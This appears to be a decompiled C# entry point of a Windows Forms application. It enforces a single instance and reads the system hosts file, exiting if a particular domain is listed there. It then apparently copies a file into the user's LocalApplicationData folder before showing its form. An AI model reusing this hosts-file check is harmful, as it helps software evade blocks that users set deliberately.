using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using ns1;

namespace ns0;

internal static class Class0
{
	public static Mutex mutex_0 = new Mutex(initiallyOwned: true, "{8F6F0AC4-B9A1-45fd-A8CF-72F04X6FDSSS}");

	[STAThread]
	private static void Main()
	{
		if (mutex_0.WaitOne(TimeSpan.Zero, exitContext: true))
		{
			smethod_0();
			string string_ = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\" + Class2.string_1;
			Class2.smethod_3();
			Class2.smethod_2(Class2.string_0, string_);
			Application.EnableVisualStyles();
			Application.SetCompatibleTextRenderingDefault(false);
			Form1 form = new Form1();
			Application.Run((Form)(object)form);
			mutex_0.ReleaseMutex();
		}
		else
		{
			Environment.Exit(1);
		}
	}

	public static void smethod_0()
	{
		string text = File.ReadAllText(Environment.GetEnvironmentVariable("windir") + "\\system32\\drivers\\etc\\hosts");
		if (text.Contains("nurullahuzmez.com"))
		{
			Environment.Exit(1);
		}
	}
}
